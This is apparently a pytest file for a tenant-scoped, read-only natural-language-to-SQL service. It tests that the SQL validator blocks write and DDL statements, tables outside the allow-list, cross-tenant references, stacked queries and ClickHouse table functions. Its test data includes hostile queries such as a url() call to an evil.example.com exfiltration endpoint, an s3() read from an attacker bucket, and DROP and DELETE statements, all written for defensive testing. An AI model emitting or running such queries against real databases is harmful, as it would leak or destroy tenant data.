"""Tests for Phase 4, Task 4.3 — NL→SQL grounded, validated, read-only endpoint.

Strategy
--------
All tests run entirely in-process.  Three external boundaries are mocked:
  1. The LLM gateway (``LLMGateway.complete``) — returns controlled SQL strings.
  2. The Cube semantic layer (``SemanticLayerClient.meta``) — returns a fake schema.
  3. The ClickHouse query runner (``ClickHouseDatasetService.run_read_only_query``)
     — returns fake rows.

No real network calls or live infra are required.

Acceptance criteria
-------------------
(a) Valid question → validates → executes → correct response.
(b) Write/DDL SQL (DELETE, UPDATE, DROP, INSERT) → rejected at validation;
    execute path never called.
(c) Off-semantic-layer table reference → rejected; execute path never called.
(d) Cross-tenant DB qualifier → rejected; execute path never called.
(e) Multi-statement / stacked query → rejected; execute path never called.
(f) UNSATISFIABLE sentinel → rejected with a user-friendly message.
(g) No raw LLM provider errors or API keys are returned to the caller.
(h) Cube meta: meta() sends a tenant-scoped JWT to /meta and parses cubes.
(i) Grounding context includes only governed objects from meta.
(j) Settings: serving_regional_sales_table is readable from env; COMPLETE_ENV
    in test_settings.py continues to pass (tested via separate import).

Additional isolation tests
--------------------------
(k) run_read_only_query is never called when validation fails.
(l) Two tenants produce independent grounding contexts (no cross-tenant leak).
"""
from __future__ import annotations

import json
import uuid
from typing import Any
from unittest.mock import AsyncMock, MagicMock

import httpx
import pytest

from app.ai.gateway.provider import LLMResponse
from app.ai.nl_sql.grounding import build_grounding_context
from app.ai.nl_sql.service import NLToSQLService
from app.ai.nl_sql.validator import SQLValidationError, validate_and_cap
from app.ai.semantic.client import (
    CubeAuthError,
    SemanticLayerClient,
)
from app.core.clickhouse import QueryResult
from app.core.config import CubeSettings
from app.tenancy.context import TenantContext
from app.tenancy.resources import resources_for_slug

# ---------------------------------------------------------------------------
# Shared test helpers
# ---------------------------------------------------------------------------

_ALLOWED_TABLE = "serving_regional_sales"
_TENANT_DB = "tenant_acme"
_MAX_ROWS = 10_000

_FAKE_META = {
    "cubes": [
        {
            "name": "regional_sales",
            "title": "Regional Sales",
            "description": "Sales data by region",
            "measures": [
                {"name": "regional_sales.total_amount", "title": "Total Amount", "type": "sum"},
            ],
            "dimensions": [
                {"name": "regional_sales.region", "title": "Region", "type": "string"},
            ],
        }
    ]
}


def _make_ctx(slug: str = "acme") -> TenantContext:
    res = resources_for_slug(slug)
    return TenantContext(
        tenant_id=str(uuid.uuid4()),
        iceberg_namespace=res.iceberg_namespace,
        clickhouse_db=res.clickhouse_db,
        dbt_schema=res.dbt_schema,
    )


def _make_query_result(
    columns: list[str] | None = None,
    rows: list[tuple[Any, ...]] | None = None,
) -> QueryResult:
    return QueryResult(
        column_names=columns or ["region", "total_amount"],
        rows=rows or [("EMEA", 142500)],
    )


def _make_llm_response(sql: str) -> LLMResponse:
    return LLMResponse(
        text=sql,
        model="claude-test",
        usage={"input_tokens": 100, "output_tokens": 50},
    )


def _make_service(
    *,
    gateway_response: LLMResponse | None = None,
    meta_response: dict[str, Any] | None = None,
    query_result: QueryResult | None = None,
    tenant_db: str = _TENANT_DB,
    allowed_table: str = _ALLOWED_TABLE,
    max_rows: int = _MAX_ROWS,
) -> tuple[NLToSQLService, MagicMock, MagicMock, MagicMock]:
    """Build an NLToSQLService with all external deps mocked.

    Returns (service, mock_gateway, mock_semantic, mock_ch).
    """
    from pathlib import Path
    from unittest.mock import MagicMock

    from app.ai.gateway.gateway import LLMGateway
    from app.ai.gateway.loader import PromptLoader
    from app.ai.semantic.client import SemanticLayerClient
    from app.services.clickhouse_datasets import ClickHouseDatasetService

    # Real PromptLoader pointed at the real prompt templates directory.
    # This ensures the template rendering path is exercised, not mocked.
    prompts_dir = Path(__file__).parent.parent / "app" / "ai" / "prompts"
    loader = PromptLoader(str(prompts_dir))

    # Mock gateway
    mock_gateway = MagicMock(spec=LLMGateway)
    effective_response = gateway_response or _make_llm_response(
        f"SELECT region, total_amount FROM {allowed_table} LIMIT 100"
    )
    mock_gateway.complete = AsyncMock(return_value=effective_response)

    # Mock semantic client
    mock_semantic = MagicMock(spec=SemanticLayerClient)
    mock_semantic.meta = AsyncMock(return_value=meta_response or _FAKE_META)

    # Mock ClickHouse runner
    mock_ch = MagicMock(spec=ClickHouseDatasetService)
    mock_ch.run_read_only_query = MagicMock(return_value=query_result or _make_query_result())

    # Mock Settings
    mock_settings = MagicMock()
    mock_settings.serving_regional_sales_table = allowed_table
    mock_settings.max_query_rows = max_rows

    svc = NLToSQLService(
        gateway=mock_gateway,  # type: ignore[arg-type]
        prompt_loader=loader,
        semantic_client=mock_semantic,  # type: ignore[arg-type]
        ch_dataset_svc=mock_ch,  # type: ignore[arg-type]
        settings=mock_settings,  # type: ignore[arg-type]
    )
    return svc, mock_gateway, mock_semantic, mock_ch


# ===========================================================================
# (a) Valid question → validates → executes → rows returned
# ===========================================================================


@pytest.mark.asyncio
async def test_valid_question_returns_rows() -> None:
    """A well-formed SELECT → validates → executes → NLQueryResponse-compatible tuple."""
    ctx = _make_ctx()
    valid_sql = f"SELECT region, total_amount FROM {_ALLOWED_TABLE} LIMIT 50"
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(valid_sql),
        query_result=_make_query_result(
            columns=["region", "total_amount"],
            rows=[("EMEA", 142500), ("APAC", 98300)],
        ),
    )

    validated_sql, result = await svc.query(ctx, question="Show sales by region")

    assert result.column_names == ["region", "total_amount"]
    assert len(result.rows) == 2
    assert result.rows[0] == ("EMEA", 142500)
    # Execute was called exactly once with the validated SQL.
    mock_ch.run_read_only_query.assert_called_once_with(ctx, validated_sql)


@pytest.mark.asyncio
async def test_valid_sql_without_limit_gets_limit_injected() -> None:
    """A valid SELECT without LIMIT gets a LIMIT injected (≤ max_rows)."""
    ctx = _make_ctx()
    sql_no_limit = f"SELECT region FROM {_ALLOWED_TABLE}"
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(sql_no_limit),
        max_rows=5000,
    )

    validated_sql, _ = await svc.query(ctx, question="What regions exist?")

    assert "LIMIT" in validated_sql.upper()
    assert "5000" in validated_sql
    mock_ch.run_read_only_query.assert_called_once()


@pytest.mark.asyncio
async def test_valid_sql_with_excessive_limit_is_clamped() -> None:
    """A LIMIT exceeding max_rows is clamped to max_rows."""
    ctx = _make_ctx()
    sql_big_limit = f"SELECT region FROM {_ALLOWED_TABLE} LIMIT 9999999"
    svc, _, _, _mock_ch = _make_service(
        gateway_response=_make_llm_response(sql_big_limit),
        max_rows=10_000,
    )

    validated_sql, _ = await svc.query(ctx, question="Get all regions")

    # The validated SQL must not have 9999999; must have 10000.
    assert "9999999" not in validated_sql
    assert "10000" in validated_sql


@pytest.mark.asyncio
async def test_qualified_table_with_correct_tenant_db_is_accepted() -> None:
    """A fully-qualified ``tenant_db.table`` reference is accepted if DB matches tenant."""
    ctx = _make_ctx()  # ctx.clickhouse_db = "tenant_acme"
    sql = f"SELECT region FROM {ctx.clickhouse_db}.{_ALLOWED_TABLE} LIMIT 10"
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(sql),
    )

    _validated_sql, result = await svc.query(ctx, question="Show regions")

    mock_ch.run_read_only_query.assert_called_once()
    assert result is not None


# ===========================================================================
# (b) Write / DDL SQL is rejected; execute path NEVER called
# ===========================================================================


@pytest.mark.asyncio
async def test_delete_statement_is_rejected() -> None:
    """A DELETE statement is rejected at validation; execute is never called."""
    ctx = _make_ctx()
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(
            f"DELETE FROM {_ALLOWED_TABLE} WHERE region = 'EMEA'"
        ),
    )

    with pytest.raises(SQLValidationError) as exc_info:
        await svc.query(ctx, question="Delete EMEA data")

    reason = exc_info.value.reason.lower()
    assert "not read-only" in reason or "select" in reason
    mock_ch.run_read_only_query.assert_not_called()


@pytest.mark.asyncio
async def test_update_statement_is_rejected() -> None:
    """An UPDATE statement is rejected; execute never called."""
    ctx = _make_ctx()
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(
            f"UPDATE {_ALLOWED_TABLE} SET total_amount = 0"
        ),
    )

    with pytest.raises(SQLValidationError):
        await svc.query(ctx, question="Zero out amounts")

    mock_ch.run_read_only_query.assert_not_called()


@pytest.mark.asyncio
async def test_drop_statement_is_rejected() -> None:
    """A DROP TABLE is rejected; execute never called."""
    ctx = _make_ctx()
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(f"DROP TABLE {_ALLOWED_TABLE}"),
    )

    with pytest.raises(SQLValidationError):
        await svc.query(ctx, question="Drop the table")

    mock_ch.run_read_only_query.assert_not_called()


@pytest.mark.asyncio
async def test_insert_statement_is_rejected() -> None:
    """An INSERT statement is rejected; execute never called."""
    ctx = _make_ctx()
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(
            f"INSERT INTO {_ALLOWED_TABLE} VALUES ('EMEA', 100)"
        ),
    )

    with pytest.raises(SQLValidationError):
        await svc.query(ctx, question="Insert a row")

    mock_ch.run_read_only_query.assert_not_called()


@pytest.mark.asyncio
async def test_create_table_is_rejected() -> None:
    """A CREATE TABLE is rejected; execute never called."""
    ctx = _make_ctx()
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response("CREATE TABLE foo (id Int32)"),
    )

    with pytest.raises(SQLValidationError):
        await svc.query(ctx, question="Create a table")

    mock_ch.run_read_only_query.assert_not_called()


# ===========================================================================
# (c) Off-semantic-layer table reference is rejected; execute NEVER called
# ===========================================================================


@pytest.mark.asyncio
async def test_unlisted_table_is_rejected() -> None:
    """A SELECT against a non-allow-listed table is rejected."""
    ctx = _make_ctx()
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response("SELECT * FROM secrets LIMIT 10"),
    )

    with pytest.raises(SQLValidationError) as exc_info:
        await svc.query(ctx, question="Show secrets")

    assert "secrets" in exc_info.value.reason.lower() or "govern" in exc_info.value.reason.lower()
    mock_ch.run_read_only_query.assert_not_called()


@pytest.mark.asyncio
async def test_system_table_is_rejected() -> None:
    """A SELECT against a system table (e.g. system.tables) is rejected."""
    ctx = _make_ctx()
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(
            "SELECT * FROM system.tables LIMIT 5"
        ),
    )

    with pytest.raises(SQLValidationError):
        await svc.query(ctx, question="List all tables")

    mock_ch.run_read_only_query.assert_not_called()


@pytest.mark.asyncio
async def test_mixed_allowed_and_disallowed_table_is_rejected() -> None:
    """A JOIN mixing allowed and disallowed tables is rejected."""
    ctx = _make_ctx()
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(
            f"SELECT a.region FROM {_ALLOWED_TABLE} a "
            "JOIN users u ON a.id = u.id LIMIT 10"
        ),
    )

    with pytest.raises(SQLValidationError):
        await svc.query(ctx, question="Join sales with users")

    mock_ch.run_read_only_query.assert_not_called()


# ===========================================================================
# (d) Cross-tenant DB qualifier is rejected; execute NEVER called
# ===========================================================================


@pytest.mark.asyncio
async def test_cross_tenant_db_qualifier_is_rejected() -> None:
    """An LLM-emitted other_tenant_db.table is rejected even if table name is allowed."""
    ctx = _make_ctx()  # ctx.clickhouse_db = "tenant_acme"
    # LLM emits a cross-tenant qualified reference.
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(
            f"SELECT region FROM tenant_other.{_ALLOWED_TABLE} LIMIT 10"
        ),
    )

    with pytest.raises(SQLValidationError) as exc_info:
        await svc.query(ctx, question="Show other tenant regions")

    assert "tenant" in exc_info.value.reason.lower() or "cross" in exc_info.value.reason.lower()
    mock_ch.run_read_only_query.assert_not_called()


@pytest.mark.asyncio
async def test_cross_tenant_db_qualifier_direct_validator() -> None:
    """Direct validator test: cross-tenant qualifier raises SQLValidationError."""
    sql = f"SELECT region FROM tenant_other.{_ALLOWED_TABLE} LIMIT 10"

    with pytest.raises(SQLValidationError) as exc_info:
        validate_and_cap(
            sql,
            allowed_tables={_ALLOWED_TABLE},
            tenant_db="tenant_acme",
            max_rows=_MAX_ROWS,
        )

    assert "tenant" in exc_info.value.reason.lower() or "cross" in exc_info.value.reason.lower()


# ===========================================================================
# (e) Multi-statement / stacked query is rejected; execute NEVER called
# ===========================================================================


@pytest.mark.asyncio
async def test_multi_statement_is_rejected() -> None:
    """Two statements separated by semicolons are rejected."""
    ctx = _make_ctx()
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(
            f"SELECT region FROM {_ALLOWED_TABLE} LIMIT 5; "
            f"SELECT total_amount FROM {_ALLOWED_TABLE} LIMIT 5"
        ),
    )

    with pytest.raises(SQLValidationError) as exc_info:
        await svc.query(ctx, question="Two queries")

    assert "multiple" in exc_info.value.reason.lower() or "single" in exc_info.value.reason.lower()
    mock_ch.run_read_only_query.assert_not_called()


def test_multi_statement_direct_validator() -> None:
    """Direct validator: multi-statement SQL raises SQLValidationError."""
    sql = (
        f"SELECT region FROM {_ALLOWED_TABLE} LIMIT 5; "
        f"SELECT total_amount FROM {_ALLOWED_TABLE} LIMIT 5"
    )

    with pytest.raises(SQLValidationError) as exc_info:
        validate_and_cap(
            sql,
            allowed_tables={_ALLOWED_TABLE},
            tenant_db=_TENANT_DB,
            max_rows=_MAX_ROWS,
        )

    assert "multiple" in exc_info.value.reason.lower() or "single" in exc_info.value.reason.lower()


# ===========================================================================
# (f) UNSATISFIABLE sentinel → user-friendly message
# ===========================================================================


@pytest.mark.asyncio
async def test_unsatisfiable_sentinel_raises_validation_error() -> None:
    """When the LLM returns UNSATISFIABLE the service raises SQLValidationError."""
    ctx = _make_ctx()
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response("UNSATISFIABLE"),
    )

    with pytest.raises(SQLValidationError) as exc_info:
        await svc.query(ctx, question="What is the meaning of life?")

    reason = exc_info.value.reason.lower()
    assert "rephrase" in reason or "cannot be answered" in reason
    mock_ch.run_read_only_query.assert_not_called()


def test_unsatisfiable_direct_validator() -> None:
    """Direct validator: UNSATISFIABLE raises with user-friendly message."""
    with pytest.raises(SQLValidationError) as exc_info:
        validate_and_cap(
            "UNSATISFIABLE",
            allowed_tables={_ALLOWED_TABLE},
            tenant_db=_TENANT_DB,
            max_rows=_MAX_ROWS,
        )

    reason = exc_info.value.reason.lower()
    assert "rephrase" in reason or "cannot be answered" in reason or "manual" in reason


# ===========================================================================
# Validator edge cases
# ===========================================================================


def test_validator_accepts_valid_select() -> None:
    """validate_and_cap passes a well-formed SELECT."""
    sql = f"SELECT region, total_amount FROM {_ALLOWED_TABLE} LIMIT 100"
    result = validate_and_cap(
        sql,
        allowed_tables={_ALLOWED_TABLE},
        tenant_db=_TENANT_DB,
        max_rows=_MAX_ROWS,
    )
    assert "SELECT" in result.upper()
    assert "LIMIT" in result.upper()


def test_validator_rejects_unparseable_sql() -> None:
    """Gibberish SQL is rejected with a parse error."""
    with pytest.raises(SQLValidationError) as exc_info:
        validate_and_cap(
            "XYZZY FROBBLE WOBBLE",
            allowed_tables={_ALLOWED_TABLE},
            tenant_db=_TENANT_DB,
            max_rows=_MAX_ROWS,
        )
    assert "parse" in exc_info.value.reason.lower() or "rephrase" in exc_info.value.reason.lower()


def test_validator_strips_comments() -> None:
    """Comments are stripped from the validated SQL."""
    sql = f"-- find all regions\nSELECT region FROM {_ALLOWED_TABLE} LIMIT 10"
    result = validate_and_cap(
        sql,
        allowed_tables={_ALLOWED_TABLE},
        tenant_db=_TENANT_DB,
        max_rows=_MAX_ROWS,
    )
    assert "--" not in result


def test_validator_injects_limit_when_absent() -> None:
    """Missing LIMIT clause → injected."""
    sql = f"SELECT region FROM {_ALLOWED_TABLE}"
    result = validate_and_cap(
        sql,
        allowed_tables={_ALLOWED_TABLE},
        tenant_db=_TENANT_DB,
        max_rows=500,
    )
    assert "LIMIT" in result.upper()
    assert "500" in result


def test_validator_clamps_excessive_limit() -> None:
    """LIMIT exceeding max_rows is clamped."""
    sql = f"SELECT region FROM {_ALLOWED_TABLE} LIMIT 99999"
    result = validate_and_cap(
        sql,
        allowed_tables={_ALLOWED_TABLE},
        tenant_db=_TENANT_DB,
        max_rows=1000,
    )
    assert "99999" not in result
    assert "1000" in result


def test_validator_preserves_limit_under_cap() -> None:
    """A LIMIT ≤ max_rows is preserved."""
    sql = f"SELECT region FROM {_ALLOWED_TABLE} LIMIT 42"
    result = validate_and_cap(
        sql,
        allowed_tables={_ALLOWED_TABLE},
        tenant_db=_TENANT_DB,
        max_rows=1000,
    )
    assert "42" in result


# ===========================================================================
# (h) SemanticLayerClient.meta() — tenant-scoped JWT, /meta path
# ===========================================================================


@pytest.mark.asyncio
async def test_meta_calls_correct_endpoint() -> None:
    """meta() calls GET {base_url}/cubejs-api/v1/meta."""
    from pydantic import SecretStr

    captured: list[httpx.Request] = []
    fake_body = json.dumps(_FAKE_META).encode()

    def _handler(request: httpx.Request) -> httpx.Response:
        captured.append(request)
        return httpx.Response(200, content=fake_body)

    transport = httpx.MockTransport(_handler)
    http_client = httpx.AsyncClient(transport=transport)

    cube_cfg = MagicMock(spec=CubeSettings)
    cube_cfg.base_url = "http://cube-test:4000"
    cube_cfg.api_secret = SecretStr("test-secret-at-least-32-chars-long!")

    client = SemanticLayerClient(cube_settings=cube_cfg, http_client=http_client)
    ctx = _make_ctx("acme")

    result = await client.meta(ctx)

    assert len(captured) == 1
    assert captured[0].method == "GET"
    assert str(captured[0].url) == "http://cube-test:4000/cubejs-api/v1/meta"
    assert "cubes" in result


@pytest.mark.asyncio
async def test_meta_carries_tenant_scoped_jwt() -> None:
    """meta() sends a JWT with the tenant's clickhouse_db claim."""
    import jwt
    from pydantic import SecretStr

    secret = "test-secret-at-least-32-chars-long!"
    captured: list[httpx.Request] = []
    fake_body = json.dumps(_FAKE_META).encode()

    def _handler(request: httpx.Request) -> httpx.Response:
        captured.append(request)
        return httpx.Response(200, content=fake_body)

    transport = httpx.MockTransport(_handler)
    http_client = httpx.AsyncClient(transport=transport)

    cube_cfg = MagicMock(spec=CubeSettings)
    cube_cfg.base_url = "http://cube-test:4000"
    cube_cfg.api_secret = SecretStr(secret)

    client = SemanticLayerClient(cube_settings=cube_cfg, http_client=http_client)
    ctx = _make_ctx("widgetco")

    await client.meta(ctx)

    auth_header = captured[0].headers.get("authorization", "")
    assert auth_header.startswith("Bearer ")
    token = auth_header.split(" ", 1)[1]
    decoded = jwt.decode(token, secret, algorithms=["HS256"])
    assert decoded["clickhouse_db"] == ctx.clickhouse_db


@pytest.mark.asyncio
async def test_meta_raises_cube_auth_error_on_403() -> None:
    """meta() raises CubeAuthError on a 403 from Cube."""
    from pydantic import SecretStr

    def _handler(_request: httpx.Request) -> httpx.Response:
        return httpx.Response(403, content=b'{"error":"Unauthorized"}')

    transport = httpx.MockTransport(_handler)
    http_client = httpx.AsyncClient(transport=transport)

    cube_cfg = MagicMock(spec=CubeSettings)
    cube_cfg.base_url = "http://cube-test:4000"
    cube_cfg.api_secret = SecretStr("test-secret-at-least-32-chars-long!")

    client = SemanticLayerClient(cube_settings=cube_cfg, http_client=http_client)
    ctx = _make_ctx("acme")

    with pytest.raises(CubeAuthError) as exc_info:
        await client.meta(ctx)

    assert exc_info.value.status == 403


# ===========================================================================
# (i) Grounding context from meta
# ===========================================================================


def test_grounding_context_includes_cube_name() -> None:
    """build_grounding_context includes the cube name in the semantic text."""
    grounding = build_grounding_context(_FAKE_META, config_tables={"serving_regional_sales"})

    assert "regional_sales" in grounding.semantic_text


def test_grounding_context_includes_measures() -> None:
    """Measures from Cube meta appear in the grounding text as column names."""
    grounding = build_grounding_context(_FAKE_META, config_tables={"serving_regional_sales"})

    assert "total_amount" in grounding.semantic_text
    # Heading text may say "Measures" (with or without the extra parenthetical).
    assert "measures" in grounding.semantic_text.lower()


def test_grounding_context_includes_dimensions() -> None:
    """Dimensions from Cube meta appear in the grounding text as column names."""
    grounding = build_grounding_context(_FAKE_META, config_tables={"serving_regional_sales"})

    assert "region" in grounding.semantic_text
    # Heading text may say "Dimensions" (with or without the extra parenthetical).
    assert "dimensions" in grounding.semantic_text.lower()


def test_grounding_context_allow_list_includes_config_tables() -> None:
    """Config tables are always in the allow-list regardless of what Cube exposes."""
    grounding = build_grounding_context(
        {"cubes": []},  # Cube returns empty cubes
        config_tables={"serving_regional_sales"},
    )

    assert "serving_regional_sales" in grounding.physical_tables


def test_grounding_context_sql_table_annotation_does_not_widen_allow_list() -> None:
    """FIX 3: sql_table annotations from Cube do NOT widen the physical_tables set.

    The allow-list is config-bound only.  A misconfigured or compromised Cube
    instance cannot expand the set of reachable physical tables.
    """
    meta_with_sql_table = {
        "cubes": [
            {
                "name": "regional_sales",
                "sql_table": "serving_regional_sales",
                "measures": [],
                "dimensions": [],
            }
        ]
    }
    # Pass an empty config_tables — sql_table must NOT be added.
    grounding = build_grounding_context(meta_with_sql_table, config_tables=set())

    # The physical_tables set must be empty because no config table was provided.
    assert "serving_regional_sales" not in grounding.physical_tables


def test_grounding_context_physical_table_name_in_semantic_text() -> None:
    """FIX 3: The governed physical table name appears in the semantic text so the LLM
    knows which physical table to query."""
    grounding = build_grounding_context(
        _FAKE_META, config_tables={"serving_regional_sales"}
    )

    # The physical table name must be explicitly stated in the prompt text.
    assert "serving_regional_sales" in grounding.semantic_text


def test_grounding_context_empty_meta_returns_sentinel_text() -> None:
    """Empty cubes returns the sentinel 'no governed objects' text."""
    grounding = build_grounding_context({"cubes": []}, config_tables=set())

    assert "no governed objects" in grounding.semantic_text.lower()


# ===========================================================================
# (j) Settings: serving_regional_sales_table env var
# ===========================================================================


def test_settings_serving_regional_sales_table_default(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Settings.serving_regional_sales_table defaults to 'serving_regional_sales'."""
    from app.core.config import get_settings

    get_settings.cache_clear()

    # Use the minimal complete env from test_settings but without explicit SERVING var.
    env = {
        "ENVIRONMENT": "test",
        "POSTGRES__HOST": "localhost",
        "POSTGRES__USER": "test",
        "POSTGRES__PASSWORD": "test",
        "POSTGRES__DB": "test",
        "REDIS__HOST": "localhost",
        "OBJECT_STORE__ENDPOINT_URL": "http://localhost:9000",
        "OBJECT_STORE__ACCESS_KEY": "testkey",
        "OBJECT_STORE__SECRET_KEY": "testsecret",
        "OBJECT_STORE__BUCKET": "test-bucket",
        "ICEBERG__CATALOG_URI": "http://localhost:8181",
        "ICEBERG__WAREHOUSE": "s3://test/warehouse",
        "CLICKHOUSE__HOST": "localhost",
        "CLICKHOUSE__PASSWORD": "test",
        "AI__PROVIDER": "anthropic",
        "AI__MODEL": "claude-test",
        "AI__API_KEY": "sk-test",
        "AI__PROMPT_TEMPLATE_DIR": "prompts",
        "CUBE__BASE_URL": "http://cube:4000",
        "CUBE__API_SECRET": "a-random-secret-of-at-least-32-chars",
        "AUTH__DEV_STUB": "true",
        "AUTH__DEV_STUB_SECRET": "test-secret-at-least-32-chars-long!",
        "SEED_TENANT__SLUG": "local",
        "SEED_TENANT__NAME": "Local",
        "SEED_TENANT__ADMIN_EMAIL": "admin@local.test",
    }
    for k, v in env.items():
        monkeypatch.setenv(k, v)
    monkeypatch.delenv("SERVING_REGIONAL_SALES_TABLE", raising=False)

    settings = get_settings()
    assert settings.serving_regional_sales_table == "serving_regional_sales"

    get_settings.cache_clear()


def test_settings_serving_regional_sales_table_from_env(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """SERVING_REGIONAL_SALES_TABLE env var overrides the default."""
    from app.core.config import get_settings

    get_settings.cache_clear()

    env = {
        "ENVIRONMENT": "test",
        "POSTGRES__HOST": "localhost",
        "POSTGRES__USER": "test",
        "POSTGRES__PASSWORD": "test",
        "POSTGRES__DB": "test",
        "REDIS__HOST": "localhost",
        "OBJECT_STORE__ENDPOINT_URL": "http://localhost:9000",
        "OBJECT_STORE__ACCESS_KEY": "testkey",
        "OBJECT_STORE__SECRET_KEY": "testsecret",
        "OBJECT_STORE__BUCKET": "test-bucket",
        "ICEBERG__CATALOG_URI": "http://localhost:8181",
        "ICEBERG__WAREHOUSE": "s3://test/warehouse",
        "CLICKHOUSE__HOST": "localhost",
        "CLICKHOUSE__PASSWORD": "test",
        "AI__PROVIDER": "anthropic",
        "AI__MODEL": "claude-test",
        "AI__API_KEY": "sk-test",
        "AI__PROMPT_TEMPLATE_DIR": "prompts",
        "CUBE__BASE_URL": "http://cube:4000",
        "CUBE__API_SECRET": "a-random-secret-of-at-least-32-chars",
        "AUTH__DEV_STUB": "true",
        "AUTH__DEV_STUB_SECRET": "test-secret-at-least-32-chars-long!",
        "SEED_TENANT__SLUG": "local",
        "SEED_TENANT__NAME": "Local",
        "SEED_TENANT__ADMIN_EMAIL": "admin@local.test",
        "SERVING_REGIONAL_SALES_TABLE": "custom_sales_table",
    }
    for k, v in env.items():
        monkeypatch.setenv(k, v)

    settings = get_settings()
    assert settings.serving_regional_sales_table == "custom_sales_table"

    get_settings.cache_clear()


# ===========================================================================
# (l) Two tenants produce independent grounding contexts (no cross-tenant leak)
# ===========================================================================


@pytest.mark.asyncio
async def test_two_tenants_independent_grounding() -> None:
    """Grounding for tenant A and tenant B use separate Cube meta calls."""
    ctx_a = _make_ctx("alpha")
    ctx_b = _make_ctx("betacorp")

    calls: list[TenantContext] = []

    async def _meta_side_effect(ctx: TenantContext) -> dict[str, Any]:
        calls.append(ctx)
        return _FAKE_META

    from pathlib import Path

    from app.ai.gateway.gateway import LLMGateway
    from app.ai.gateway.loader import PromptLoader
    from app.ai.semantic.client import SemanticLayerClient
    from app.services.clickhouse_datasets import ClickHouseDatasetService

    prompts_dir = Path(__file__).parent.parent / "app" / "ai" / "prompts"
    loader = PromptLoader(str(prompts_dir))

    mock_gateway = MagicMock(spec=LLMGateway)
    mock_gateway.complete = AsyncMock(
        return_value=_make_llm_response(
            f"SELECT region FROM {_ALLOWED_TABLE} LIMIT 10"
        )
    )
    mock_semantic = MagicMock(spec=SemanticLayerClient)
    mock_semantic.meta = AsyncMock(side_effect=_meta_side_effect)

    mock_ch = MagicMock(spec=ClickHouseDatasetService)
    mock_ch.run_read_only_query = MagicMock(return_value=_make_query_result())

    mock_settings = MagicMock()
    mock_settings.serving_regional_sales_table = _ALLOWED_TABLE
    mock_settings.max_query_rows = _MAX_ROWS

    svc = NLToSQLService(
        gateway=mock_gateway,  # type: ignore[arg-type]
        prompt_loader=loader,
        semantic_client=mock_semantic,  # type: ignore[arg-type]
        ch_dataset_svc=mock_ch,  # type: ignore[arg-type]
        settings=mock_settings,  # type: ignore[arg-type]
    )

    await svc.query(ctx_a, question="Show regions")
    await svc.query(ctx_b, question="Show regions")

    # meta was called once per tenant, with the correct context each time.
    assert len(calls) == 2
    assert calls[0].tenant_id == ctx_a.tenant_id
    assert calls[1].tenant_id == ctx_b.tenant_id
    assert calls[0].clickhouse_db != calls[1].clickhouse_db


# ===========================================================================
# Security fixes: TVF bypass (FIX 1) and SETTINGS-clause DoS (FIX 2)
# ===========================================================================


# ---------------------------------------------------------------------------
# FIX 1 — Table-valued function (TVF) bypass: each TVF must raise
# SQLValidationError and run_read_only_query must NEVER be called.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "tvf_sql",
    [
        "SELECT * FROM url('http://evil.example.com/exfil', CSV, 'c String') LIMIT 10",
        "SELECT * FROM remote('h:9000', system, users) LIMIT 10",
        "SELECT * FROM s3('s3://attacker-bucket/data.parquet', 'Parquet') LIMIT 10",
        "SELECT * FROM mysql('h:3306', 'db', 'tbl', 'user', 'pass') LIMIT 10",
        "SELECT * FROM cluster('mycluster', system, users) LIMIT 10",
    ],
    ids=["url()", "remote()", "s3()", "mysql()", "cluster()"],
)
def test_tvf_is_rejected_directly(tvf_sql: str) -> None:
    """Each ClickHouse TVF raises SQLValidationError via the direct validator."""
    with pytest.raises(SQLValidationError) as exc_info:
        validate_and_cap(
            tvf_sql,
            allowed_tables={_ALLOWED_TABLE},
            tenant_db=_TENANT_DB,
            max_rows=_MAX_ROWS,
        )
    reason = exc_info.value.reason.lower()
    # Must mention TVFs, functions, or govern/semantic-layer — never silently pass.
    assert any(
        kw in reason
        for kw in ("table-valued", "function", "govern", "semantic", "not permitted")
    ), f"Unexpected reason for TVF rejection: {exc_info.value.reason!r}"


@pytest.mark.parametrize(
    "tvf_sql",
    [
        "SELECT * FROM url('http://evil.example.com/exfil', CSV, 'c String') LIMIT 10",
        "SELECT * FROM remote('h:9000', system, users) LIMIT 10",
        "SELECT * FROM s3('s3://attacker-bucket/data.parquet', 'Parquet') LIMIT 10",
        "SELECT * FROM mysql('h:3306', 'db', 'tbl', 'user', 'pass') LIMIT 10",
        "SELECT * FROM cluster('mycluster', system, users) LIMIT 10",
    ],
    ids=["url()", "remote()", "s3()", "mysql()", "cluster()"],
)
@pytest.mark.asyncio
async def test_tvf_rejected_via_service_execute_never_called(tvf_sql: str) -> None:
    """TVF SQL is rejected at the service level; run_read_only_query has zero calls."""
    ctx = _make_ctx()
    svc, _, _, mock_ch = _make_service(
        gateway_response=_make_llm_response(tvf_sql),
    )
    with pytest.raises(SQLValidationError):
        await svc.query(ctx, question="show me external data")
    mock_ch.run_read_only_query.assert_not_called()


# ---------------------------------------------------------------------------
# FIX 2 — SETTINGS-clause DoS: SETTINGS must be stripped from the emitted SQL.
# ---------------------------------------------------------------------------


def test_settings_clause_is_stripped_from_output() -> None:
    """A SELECT with SETTINGS max_execution_time=0 executes without the SETTINGS clause."""
    sql = (
        f"SELECT region, total_amount FROM {_ALLOWED_TABLE} "
        "LIMIT 100 SETTINGS max_execution_time=0"
    )
    result = validate_and_cap(
        sql,
        allowed_tables={_ALLOWED_TABLE},
        tenant_db=_TENANT_DB,
        max_rows=_MAX_ROWS,
    )
    assert "SETTINGS" not in result.upper(), (
        f"SETTINGS clause was not stripped from validated SQL: {result!r}"
    )
    # The query body itself must still be intact.
    assert "region" in result.lower()
